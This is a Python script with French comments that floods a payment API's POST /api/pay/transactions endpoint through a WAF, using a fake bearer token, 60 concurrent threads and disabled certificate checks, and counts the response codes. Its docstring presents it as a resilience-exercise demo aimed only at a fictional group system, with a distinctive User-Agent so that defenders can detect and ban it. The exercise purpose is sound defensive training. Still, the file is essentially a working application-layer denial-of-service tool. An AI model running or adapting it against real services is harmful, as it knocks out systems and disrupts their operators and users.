#!/usr/bin/env python3
"""DoS applicatif sur payment-api, via le WAF (scénario de démo, formalisé en Phase 9).

Flood de requêtes POST /api/pay/transactions avec un jeton bidon : payment-api doit
interroger auth pour chaque requête, ce qui fait grimper latence et CPU. Le trafic porte
un User-Agent distinctif (signature) : la remédiation l'identifie dans les logs du WAF
et le bannit, sans toucher au trafic légitime.

Le script LIT les codes HTTP : une sonde au lancement indique « 403 denied » si on est
déjà banni ; sinon le flood part et le récap final donne la répartition des réponses.

Périmètre : UNIQUEMENT le SI fictif du groupe (point d'accès RESILIENCE-G12). Jamais le
réseau du campus ni une cible tierce.

Stdlib seulement : tourne dans python:3.12-slim sans dépendance.
    python dos_attack.py --target https://waf:8443 --duration 45 --concurrency 60
"""
import argparse
import ssl
import threading
import time
import urllib.error
import urllib.request

STOP = threading.Event()
LOCK = threading.Lock()
# Répartition des réponses observées : c'est elle qui raconte si l'attaque passe ou est bloquée.
STATS = {"403": 0, "401": 0, "2xx": 0, "autres": 0, "erreur": 0}


def classify(code: int | None) -> str:
    if code == 403:
        return "403"
    if code == 401:
        return "401"
    if code is not None and 200 <= code < 300:
        return "2xx"
    if code is None:
        return "erreur"
    return "autres"


def send(url: str, user_agent: str, ctx: ssl.SSLContext) -> int | None:
    req = urllib.request.Request(
        url, data=b'{"dst":2,"amount":1}', method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": "Bearer flood-no-valid-token", "User-Agent": user_agent})
    try:
        return urllib.request.urlopen(req, timeout=5, context=ctx).status
    except urllib.error.HTTPError as e:
        return e.code  # 401 (jeton rejeté), 403 (banni par le WAF), etc.
    except Exception:
        return None  # timeout / connexion refusée : service sous pression


def worker(url: str, user_agent: str, ctx: ssl.SSLContext) -> None:
    while not STOP.is_set():
        bucket = classify(send(url, user_agent, ctx))
        with LOCK:
            STATS[bucket] += 1


def main() -> None:
    p = argparse.ArgumentParser(description="DoS applicatif de démo (SI fictif uniquement)")
    p.add_argument("--target", default="https://waf:8443")
    p.add_argument("--duration", type=int, default=45)
    p.add_argument("--concurrency", type=int, default=60)
    p.add_argument("--user-agent", default="ResilienceDoS/1.0")
    args = p.parse_args()

    url = f"{args.target}/api/pay/transactions"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print(f"[attack] cible {url} | {args.concurrency} threads | {args.duration}s | UA {args.user_agent}")

    # Sonde préalable : si on est déjà banni, on le dit et on s'arrête là.
    if send(url, args.user_agent, ctx) == 403:
        print("403 denied")
        return

    threads = [threading.Thread(target=worker, args=(url, args.user_agent, ctx), daemon=True)
               for _ in range(args.concurrency)]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    STOP.set()
    time.sleep(1)

    total = sum(STATS.values())
    print(f"[attack] terminé — {total} requêtes | 403: {STATS['403']} | 401: {STATS['401']} | "
          f"2xx: {STATS['2xx']} | autres: {STATS['autres']} | erreurs: {STATS['erreur']}")


if __name__ == "__main__":
    main()
